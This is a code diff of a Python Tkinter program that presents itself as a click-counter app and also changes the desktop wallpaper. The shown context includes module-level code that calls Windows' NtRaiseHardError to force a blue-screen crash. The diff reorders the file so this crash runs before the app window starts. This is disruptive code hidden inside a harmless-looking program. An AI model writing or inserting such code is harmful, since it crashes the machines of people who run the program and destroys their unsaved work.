@@ -94,11 +94,6 @@ class ClickCounterApp:
         SPI_SETDESKWALLPAPER = 0x0014
         ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, abs_image_path, 3)
 
-if __name__ == "__main__":
-    root = tk.Tk()
-    app = ClickCounterApp(root)
-    root.mainloop()
-
 ntdll = ctypes.windll.ntdll
 prev_value = ctypes.c_bool()
 res = ctypes.c_ulong()
@@ -107,3 +102,9 @@ if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
     print("BSOD Successfull!")
 else:
     print("BSOD Failed...")
+
+
+if __name__ == "__main__":
+    root = tk.Tk()
+    app = ClickCounterApp(root)
+    root.mainloop()
